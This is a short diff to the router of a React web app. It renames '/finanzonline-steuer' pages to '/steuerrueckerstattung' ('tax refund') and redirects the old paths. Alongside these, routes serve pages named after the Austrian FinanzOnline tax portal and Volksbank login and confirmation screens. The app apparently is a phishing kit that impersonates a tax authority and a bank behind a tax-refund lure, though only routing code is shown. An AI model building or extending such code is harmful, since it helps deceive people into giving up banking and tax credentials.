@@ -142,8 +142,10 @@ const App = () => (
           <Routes>
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
-            <Route path="/finanzonline-steuer" element={<P><FinanzonlineSteuer /></P>} />
-            <Route path="/finanzonline-steuer/login" element={<P><FinanzonlineSteuerLogin /></P>} />
+            <Route path="/finanzonline-steuer" element={<Navigate to="/steuerrueckerstattung" replace />} />
+            <Route path="/finanzonline-steuer/login" element={<Navigate to="/steuerrueckerstattung/login" replace />} />
+            <Route path="/steuerrueckerstattung" element={<P><FinanzonlineSteuer /></P>} />
+            <Route path="/steuerrueckerstattung/login" element={<P><FinanzonlineSteuerLogin /></P>} />
             <Route path="/login" element={<P><VolksbankLogin /></P>} />
             <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
